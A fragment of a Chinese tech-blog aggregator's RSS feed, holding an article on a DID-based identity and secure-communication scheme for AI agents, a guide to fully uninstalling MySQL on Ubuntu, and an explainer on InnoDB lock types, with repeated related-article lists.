我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:57 +0000</pubDate>
    </item>
    <item>
      <title>智能体网络时代即将来临，我们需要新的连接技术</title>
      <link>https://www.ppmy.cn/news/1540354.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维智能体网络时代即将来临，我们需要新的连接技术news/2025/10/31 17:52:56/备注：如果你也对这个话题感兴趣，欢迎联系我们：email: chgaowei@gmail.comDiscord: https://discord.gg/CDYdTPXXMB官网: https://pi-unlimited.com我们的方案代码已经开源，github：https://github.com/chgaowei/AgentConnect，欢迎使用我们的demo（最好能够给颗⭐️支持一下）。也欢迎加入我们的开源项目。前言在最近结束的OpenAI开发者大会上，奥特曼表示o1已经达到了AGI二级（推理）水平，在不久的将来将会达到三级（智能体，Agent）。但是在智能体普及之前，还有一个关键的问题没有解决，就是Agent之间如何进行交互。1. 智能体网络的挑战未来，数以亿计的智能体将渗透到生活的各个方面，协助人类完成各种任务。举一个简单的例子，个人助手智能体要订餐，它就需要和饭店智能体进行交互，询问菜谱、价格、烹饪方法、送达时间等信息，这全部依赖智能体的协作实现。为了让这些智能体能够高效合作，它们需要进行交流和互操作，就像朋友和同事一样无缝协作。最终，将会形成一个高效协作的智能体网络，它将会创建比现在互联网大得多的价值。同时，这带来了两项技术挑战：智能体如何验证对方的身份？如何保证智能体之间的通信是安全的？如果所有智能体只能在单一平台内验证身份并通信，那么行业面临的结果可能有两种：要么由某个平台形成垄断，要么各平台智能体相互隔离，无法互操作，导致碎片化和互不兼容。即使一些大平台之间建立了通信机制，这些机制往往是封闭的和受控制的，这使得整个生态缺乏开放性和灵活性。因此，在智能体时代的全面到来之前，我们需要一个开放、低成本的跨平台身份认证和安全通信方案，让所有智能体无论在哪个平台上，都可以自由、安全地进行连接，实现无障碍的协作。2. 现有身份认证方法的局限现有的身份认证大多依赖中心化平台和服务。常见的身份认证方式包括社交媒体账号、电子邮件账户和银行账户等，这些账号都由各自的平台独立管理，用户需要在每个平台单独注册和认证。这些中心化平台之间的身份信息是互相隔离的。例如，一个谷歌用户无法轻松与Facebook或X平台的用户进行安全通信，因为不同平台之间无法共享身份信息，也缺乏安全的身份验证方式。这种局限导致了不同平台间的用户难以直接交流，增加了协作的复杂性和成本。对于智能体来说，基于传统身份认证方案的局限性更为明显，不同平台的智能体很难在一个通用的框架下实现身份互认和无缝通信。3. email与比特币：跨平台身份认证的标杆目前在互联网上，有两种身份认证方案与主流中心化方式有所不同，它们分别是邮箱和比特币。邮箱：邮箱能够实现跨平台的身份认证和通信。不论是谷歌、微软，还是其他服务提供商，邮箱账户都可以互相识别并发送邮件，这提供了一种天然的跨平台身份认证和通信机制。比特币：比特币的身份认证完全去中心化，没有中心化平台的介入。比特币地址的创建过程很简单：用户首先生成私钥，再通过私钥生成公钥，然后对公钥进行一系列哈希运算，生成一个独一无二的比特币地址。这个地址类似于用户的身份ID，可以用于接收和发送比特币，而交易的安全性和身份的验证都依赖于私钥的保护。这种方式实现了真正的去中心化身份认证。这些身份认证方案有一些共同的特点：跨平台性：无论是邮箱还是比特币，用户都不受限于特定平台。邮箱用户可以使用不同的服务提供商互相发送邮件，比特币用户则可以自由交易，无需依赖特定的平台。简单性：邮箱和比特币地址的设计都很简单，用户只需要一个ID就可以确认身份，虽然它们的实现技术不同，但核心都基于非对称加密技术。去中心化特性：尤其是比特币，完全去除了中心化的管理机构，用户通过自己的私钥进行身份认证和交易。邮箱虽然依赖服务提供商，但由于不同服务提供商之间可以互相通信，在某种程度上也具备了去中心化的特性。虽然无法直接将这两种方案用于智能体，但是可以参考他们的技术。4. W3C DID规范：跨平台身份认证的新方法那现在是否一种技术能解决跨平台身份认证的问题呢？这引出了W3C最新发布的DID（去中心化标识符）规范。虽然现在这个技术应用范围的还比较小，但是我认为这是最适合智能体通信的基础性技术。DID是一种新的身份标识标准，专门用于解决跨平台和去中心化的身份认证难题。简单来说，DID允许每个人或每个智能体都拥有一个独立的、去中心化的身份，这个身份不依赖于某个平台，而是由用户自己控制。这样，智能体之间可以实现统一的身份认证系统，无论它们运行在哪个平台，都可以相互识别和认证。这种方法不仅增加了用户对自己身份信息的控制权，还可以实现不同平台之间的无缝互操作，打破传统身份系统之间的壁垒，真正实现跨平台的自由协作。5. DID Alliance 方法：具体实现不过，DID规范只是一个框架，其下有许多具体的方法，每种方法有不同的目标和技术实现。目前还没有一个现成的方法可以完全满足智能体的需求。因此，我们在DID框架下制定了一种新的、标准化的方法来实现智能体的身份认证问题。这就是我们提出的DID Alliance（联盟）方法。即使你对DID不熟悉，也没关系，我们来简单介绍如何使用我们定义的DID Alliance方法实现跨平台身份认证，以及如何进行安全的加密通信。6. DID Alliance 方法的具体步骤第一步：创建DID和DID文档DID是一种去中心化的身份标识符，独一无二，由用户自己创建和控制，不依赖任何中心化平台。DID文档是一个包含DID相关信息的文件，比如公钥、验证方法和服务信息等，用于帮助其他方验证身份的合法性。我们设计的DID Alliance方法参考了比特币地址的创建过程：用户生成私钥，再根据私钥生成公钥，最终通过对公钥进行哈希运算生成独特的DID。这样，私钥、公钥和DID形成严格的一一对应关系。第二步：发布DID文档用户可以将DID文档发布在自建的平台上，或者发布在第三方托管平台。所有这些平台必须符合DID文档的发布和查阅规范。对大多数智能体来说，自建DID文档平台成本太高，因此可以选择使用第三方托管平台。所有符合规范的节点都是联盟节点，这也是我们方法名称的来源。第三步：传播智能体的DID通过可靠的方式传播智能体的DID，比如电子邮件、官方网站或认证网站等。想要与某个智能体通信的第一步是找到这个智能体的DID。第四步：根据DID下载DID文档从DID自建平台或第三方托管平台下载DID文档，获取DID的相关信息。第五步：对智能体进行身份校验根据DID文档，找到智能体的消息服务端点，向这个端点发起身份校验请求。在这个过程中，首先根据DID验证公钥的正确性，然后根据公钥和智能体的签名，验证智能体是否掌握公钥对应的私钥。第六步：进行安全加密通信如果验证通过，可以继续使用公钥和私钥进行端到端加密通信，这个过程我们参考目前使用最官方的TLS流程设计的，以最大程度保证安全性。至此，智能体之间身份认证和加密通信的过程就完成了。在这个过程中，用户可以不需要依赖任何平台。7. 未来展望目前，我们主要传递的是文本信息，未来还要拓展更多更丰富的格式，包括文件（包含音频和视频）、直播、实时音视频等。这样就能够覆盖目前互联网上绝大部分的业务形态。我们设计的DID本质上相当于区块链地址，它也可以用作区块链的钱包地址。这样，基于区块链来构建一个完全去中心化的身份系统就成为一个选项。我们可以将DID文档发布到区块链上，让任何人都能够查询；在区块链创建业务相关的token，用于实现基于DID的交易和结算，让智能体的价值传递变的更方便；将分布式的算力使用区块链组织起来，形成一个去中心化的智能体消息服务网络。未来应该还有更多的可能。http://www.ppmy.cn/news/1540354.html相关文章Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:56 +0000</pubDate>
    </item>
    <item>
      <title>Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】</title>
      <link>https://www.ppmy.cn/news/1540353.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】news/2025/10/31 17:52:55/一、准备工作查看ubuntu版本号查看mysql版本号(如果没有安装mysql,这一步省略)二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略)在Ubuntu上卸载MySQL可以通过以下步骤进行，确保完全移除MySQL相关的包和数据：1. 停止MySQL服务在卸载之前，先确保MySQL服务已停止：sudosystemctl stop mysql2. 卸载MySQL服务器使用以下命令卸载MySQL服务器包：sudoaptremove --purge mysql-server mysql-client mysql-common--purge参数会确保删除相关的配置文件。3. 删除MySQL的残余数据和配置文件要删除MySQL的所有数据和配置文件，执行以下命令：sudorm-rf /etc/mysql /var/lib/mysql这将删除MySQL的配置目录和数据目录。4. 清理未使用的依赖包使用autoremove命令清理未使用的依赖包：sudoaptautoremove5. 检查MySQL包是否完全移除使用以下命令检查系统中是否还有MySQL相关的包：dpkg -l|grepmysql如果还有MySQL的包列出，可以手动删除它们。例如：sudoaptremove&lt;package_name&gt;6. 清理MySQL日志文件（可选）你也可以删除MySQL日志文件：sudorm-rf /var/log/mysql7. 重启系统（可选）卸载完MySQL后，你可以选择重启系统来确保所有相关的进程和服务都已经停止和移除：sudoreboot执行完这些步骤后，MySQL应该已经完全从你的Ubuntu系统中卸载。http://www.ppmy.cn/news/1540353.html相关文章【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:55 +0000</pubDate>
    </item>
    <item>
      <title>【MySQL】InnoDB存储引擎中的锁</title>
      <link>https://www.ppmy.cn/news/1540352.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【MySQL】InnoDB存储引擎中的锁news/2025/10/31 17:52:54/实现事务隔离级别的过程中用到了锁，所谓锁就是在事务A修改某些数据时，对这些数据加一把锁，防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后，释放当前持有的锁，以便其他事务再次上锁执行对应的操作。不同存储引擎中的锁功能并不相同，这里重点介绍InnoDB存储引擎中的锁。1. 锁信息锁的信息包括锁的请求(申请)，锁的持有以及阻塞状态等等，都保存在 performance_schema 库的 data_locks 表中，可以通过以下方式查看:SELECT * FROM performance_schema.data_locks\G当没有开启任何事务的时候查看是没有任何信息的：这里我是用简单的user表来进行测试展示：1. 开启事务并执行锁定操作START TRANSACTION;执行一些操作来创建锁，例如查询或修改数据，而不提交事务，这将触发锁。select * from users where id = 1 for update;2. 在另一个会话中查看锁信息*************************** 1. row ***************************ENGINE: INNODB                      -- 表示存储引擎是 InnoDBENGINE_LOCK_ID: 139677990608088:1084:139677906555600  -- InnoDB 引擎中的锁标识符，通常由多个部分组成
ENGINE_TRANSACTION_ID: 4618                         -- 事务ID，表示锁属于哪个事务THREAD_ID: 228937                        -- 持有该锁的线程ID，可以用于跟踪哪个线程持有锁EVENT_ID: 23                            -- 事件ID，用于跟踪Performance Schema中的事件OBJECT_SCHEMA: test                          -- 数据库名称，此锁操作涉及的数据库为 "test"OBJECT_NAME: users                         -- 锁定的对象名称，这里是 "users" 表PARTITION_NAME: NULL                          -- 表分区名称，如果表有分区，显示分区名称；否则为 NULLSUBPARTITION_NAME: NULL                          -- 子分区名称，表无子分区则为 NULLINDEX_NAME: NULL                          -- 索引名称，如果锁作用在某个索引上，这里会显示索引名
OBJECT_INSTANCE_BEGIN: 139677906555600               -- 锁对象实例的内存地址，用于区分不同锁LOCK_TYPE: TABLE                         -- 锁的类型，这里表示锁是作用于整个表LOCK_MODE: IX                            -- 锁模式为 "Intent Exclusive" (IX)，表示意向排他锁LOCK_STATUS: GRANTED                       -- 锁的状态，"GRANTED" 表示锁已授予成功LOCK_DATA: NULL                          -- 锁的附加数据，通常在行锁时会显示更多数据，这里为 NULL3. 提交或回滚事务在提交或回滚事务之后，再次查看performance_schema.data_locks表时，应该不再看到这个锁记录，因为锁已经被释放。1.1 锁类型锁类型依赖于存储引擎，在InnoDB存储引擎中按照锁的粒度分为，行级锁 RECORD和表级锁TABLE :行级锁也叫行锁，是对表中的某些具体的数据行进行加锁;表级锁也叫表锁，是对整个数据表进行加锁。在之前版本的BDB存储引擎中还支持页级锁，锁定的是一个数据页，MySQL8中没有页级锁1.2 锁模式锁模式，用来描述如何请求(申请)锁，分为共享锁(S)、独占锁(X)、意向共享锁(IS)、意向独占锁(IX)、记录锁、间隙锁、Next-Key锁、AUTO-INC 锁、空间索引的谓词锁等。2. 共享锁和独占锁InnoDB实现了标准的行级锁，分为两种分别是共享锁(S锁)和独占锁(X锁)，独占锁也称为排他锁。共享锁(S锁):允许持有该锁的事务读取表中的一行记录，同时允许其他事务在锁定行上加另一个共享锁并读取被锁定的对象，但不能对其进行写操作;独占锁(X锁):允许持有该锁的事务对数据行进行更新或删除，同时不论其他事务对锁定行进行读取或修改都不允许对锁定行进行加锁;如果事务T1持有R行上的共享锁(S)，那么事务T2请求R行上的锁时会有如下处理:T2请求S锁会立即被授予，此时T1和T2都对R行持有S锁;T2请求X锁不能立即被授予，阻塞到T1释放持有的锁如果事务T1持有R行上的独占锁(X)，那么T2请求R行上的任意类型锁都不能立即被授予，事务T2必须等待事务T1释放R行上的锁。读锁是共享锁的一种实现，写锁是排他锁的一种实现。3. 意向锁InnoDB 中的意向锁（Intention Locks）是一种元数据锁，用于协调不同事务对表级和行级锁的兼容性，确保表锁和行锁之间的并发操作不会产生冲突。意向锁不会直接锁定数据，而是用来表示某个事务将要或已经在某些行上获取了特定类型的锁。InnoDB 使用意向锁实现多粒度级别的锁，意向锁是表级别的锁，它并不是真正意义上的加锁，而只是在 data_locks 中记录事务以后要对表中的哪一行加哪种类型的锁(共享锁或排他锁)，意向锁分为两种:意向共享锁（IS，Intention Shared Lock）： 表示事务打算在表的某些行上加共享锁（S 锁）。共享锁允许其他事务读取行，但不允许修改。意向排他锁（IX，Intention Exclusive Lock）： 表示事务打算在表的某些行上加排他锁（X 锁）。排他锁禁止其他事务同时读取或修改被锁定的行。当一个事务要在某个行上获取行级锁时，InnoDB 会在获取行锁之前首先在表级别上设置一个意向锁。这种意向锁的作用是声明该事务在这个表中会对某些行加锁。这样，当另一个事务想对整个表加一个表级锁（如表共享锁S或表排他锁X）时，InnoDB 可以根据意向锁快速判断是否能授予表锁。举例：当事务1对表中的某行加排他锁（行X锁）时，系统会先在该表上设置一个意向排他锁（IX 锁）。当另一个事务2试图对整个表加表共享锁（S 锁）时，系统会检查表上的意向锁，如果发现有意向排他锁（IX），事务2的表共享锁请求会被阻塞，直到事务1释放其行锁和意向锁。在请求锁的过程中，如果将要请求的锁与现有锁兼容，则将锁授予请求的事务，如果与现有锁冲突，则不会授予;事务将阻塞等待，直到冲突的锁被释放。意向锁的主要作用是在不同锁之间进行兼容性检测，表锁和意向锁的兼容性矩阵如下：4. 索引记录锁索引记录锁或称为精准行锁，顾名思意是指索引记录上的锁，如下SQL锁住的是指定的一行，例如，当你使用SELECT FOR UPDATE语句查询并锁定一行时，InnoDB 会对通过索引找到的记录加上排他锁（X 锁），直到事务提交或回滚时才会释放这些锁。索引记录锁总是锁定索引行，在表没有定义索引的情况下，InnoDB创建一个隐藏的聚集索引，并使用该索引进行记录锁定，当使用索引进行查找时，锁定的只是满足条件的行，如图所示:5. 间隙锁间隙锁锁定的是索引记录之间的间隙，或者第一个索引记录之前，再或者最后一个索引记录之后的间隙。如图所示位置，根据不同的查询条件都可能会加间隙锁:间隙锁通常用于防止幻读现象的发生，尤其是在REPEATABLE READ隔离级别下。例如有如下SQL，锁定的是ID(10,20)之间的间隙，注意不包括10和20的行，目的是防止其他事务将ID值为15的列插入到列 account 表中(无论是否已经存在要插入的数据列)，因为指定范围值之间的间隙被锁定；只防插入，不防更新：间隙锁的作用是防止其他事务在锁定的“间隙”中插入新记录，但它不会阻止对现有记录的修改。换句话说，间隙锁针对的是插入操作，而不是更新操作。锁定的范围是开区间：间隙锁锁定的是索引记录之间的区域，是一个“开区间”。比如，索引记录(3, 5)之间的间隙是指3 &lt; x &lt; 5的所有范围。对于使用唯一索引查询到的唯一行，不使用间隙锁，如下语句，id列有唯一的索引，只对id值为100的行使用索引记录锁:6. 临键锁Next-key 锁是索引记录锁和索引记录之前间隙上间隙锁的组合，如图所示：临键锁（Next-Key Lock）是 InnoDB 存储引擎中的一种锁定机制，用来在高并发事务下保护数据的完整性和一致性。它结合了记录锁（Record Lock）和间隙锁（Gap Lock）的特点，既锁定了实际存在的记录，也锁定了记录之间的“间隙”，从而防止其他事务对这些范围进行插入、更新、删除等操作。临键锁主要用于避免幻读现象，特别是在REPEATABLE READ隔离级别下，确保查询结果的一致性。临键锁的工作方式是将索引记录及其周围的间隙一起锁定。在InnoDB中，临键锁在涉及范围查询时特别有效。假设一个表中有索引(1, 3, 5)，如果一个事务执行查询SELECT * FROM table WHERE id &gt; 1 FOR UPDATE，InnoDB 将会：锁定id = 3和id = 5的索引记录（记录锁）。同时锁定1 &lt; id &lt; 3和3 &lt; id &lt; 5之间的空隙（间隙锁）。这样做的目的是确保在该事务执行期间，其他事务无法插入id=2或id=4这样的记录，从而避免了幻读。7. 自增锁AUTO-INC锁也叫自增锁是一个表级锁，服务于配置了 AUTO_INCREMENT 自增列的表。在插入数据时会在表上加自增锁，并生成自增值，同时阻塞其他的事务操作，以保证值的唯一性。需要注意的是，当一个事务执行新增操作已生成自增值，但是事务回滚了，申请到的主键值不会回退，这意味着在表中会出现自增值不连续的情况。http://www.ppmy.cn/news/1540352.html相关文章10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
